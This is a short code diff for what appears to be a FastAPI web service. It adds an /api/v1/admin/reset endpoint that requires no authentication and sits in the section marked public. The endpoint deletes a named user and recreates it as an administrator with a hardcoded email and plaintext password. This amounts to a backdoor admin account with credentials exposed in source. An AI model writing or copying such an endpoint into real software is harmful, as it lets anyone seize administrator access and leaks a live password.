@@ -248,6 +248,18 @@ async def get_db_stats(current_user=Depends(get_current_user)):
     return get_stats()
 
 # ── Health (público) ──────────────────────────────────────────────────
+@app.post("/api/v1/admin/reset")
+async def reset_admin():
+    from core.database import SessionLocal
+    from core.auth import UserModel, create_user
+    db = SessionLocal()
+    try:
+        db.query(UserModel).filter(UserModel.username == "daniel").delete()
+        db.commit()
+    finally:
+        db.close()
+    create_user("daniel", "daniel.glez.solucionador@gmail.com", "Centinela24", is_admin=True)
+    return {"status": "admin reset ok"}
 @app.get("/api/v1/health")
 async def health():
     db_stats = get_stats()
